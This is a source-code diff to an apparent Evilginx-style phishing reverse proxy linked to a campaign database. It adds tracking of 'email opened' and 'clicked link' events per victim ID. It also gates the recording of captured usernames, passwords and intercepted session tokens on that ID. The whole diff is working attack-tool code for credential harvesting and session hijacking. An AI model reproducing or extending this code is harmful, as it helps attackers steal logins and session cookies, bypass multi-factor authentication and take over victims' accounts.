@@ -173,18 +173,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 req_url += "?" + req.URL.RawQuery
             }
 
-            // Parse RId out of requests
+            // Handle clicked link and email opened events
             rid := ""
-            ridr, _ := regexp.Compile("client_id=([^\"]*)")
-
-            //fmt.Println("Regex test", ridr.FindString(req_url))
+            ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
+            trackr, _ := regexp.Compile(`track\?client_id=`)
             rid_match := ridr.FindString(req_url)
-            if len(rid_match) != 0 {
+            opened_match := trackr.FindString(req_url)
+            //log.Debug("Track regex", trackr.FindString(req_url))
+            //log.Debug("Rid regex", ridr.FindString(req_url))
+            if len(rid_match) != 0 && len(opened_match) == 0 {
                 rid = strings.Split(rid_match, "=")[1]
                 browser := map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
                 err := database.HandleClickedLink(rid, browser)
                 if err != nil {
                     log.Error("failed to add clicked link event to database: %s", err)
+                }
+            } else if len(rid_match) != 0 && len(opened_match) != 0 {
+                rid = strings.Split(rid_match, "=")[1]
+                browser := map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
+                err := database.HandleEmailOpened(rid, browser)
+                if err != nil {
+                    log.Error("failed to add email opened event to database: %s", err)
                 }
             }
         
@@ -472,9 +481,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                         log.Error("database: %v", err)
                                     }
                                     session := p.sessions[ps.SessionId]
-                                    err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
-                                    if err != nil {
-                                        fmt.Printf("Error submitting data to database: %s\n", err)
+                                    if len(session.RId) != 0 {
+                                        err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+                                        if err != nil {
+                                            fmt.Printf("Error submitting data to database: %s\n", err)
+                                        }
                                     }
                                 }
                             }
@@ -524,9 +535,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                                 log.Error("database: %v", err)
                                             }
                                             session := p.sessions[ps.SessionId]
-                                            err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
-                                            if err != nil {
-                                                fmt.Printf("Error submitting data to database: %s\n", err)
+                                            if len(session.RId) != 0 {
+                                                err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+                                                if err != nil {
+                                                    fmt.Printf("Error submitting data to database: %s\n", err)
+                                                }
                                             }
                                         }
                                     }
@@ -738,7 +751,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             }
             if is_auth {
                 // we have all auth tokens
-                if s, ok := p.sessions[ps.SessionId]; ok {
+                if s, ok := p.sessions[ps.SessionId]; ok && len(s.RId) != 0 {
                     log.Success("[%d] all authorization tokens intercepted!", ps.Index)
                     err = database.HandleCapturedSession(s.RId, s.Tokens)
                     if err != nil {
@@ -870,9 +883,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             }
                             if err == nil {
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-                                err = database.HandleCapturedSession(s.RId, s.Tokens)
-                                if err != nil {
-                                    fmt.Printf("Error adding captured session entry to database: %s\n", err)
+                                if len(s.RId) != 0 {
+                                    err = database.HandleCapturedSession(s.RId, s.Tokens)
+                                    if err != nil {
+                                        fmt.Printf("Error adding captured session entry to database: %s\n", err)
+                                    }
                                 }
                             }
                             break
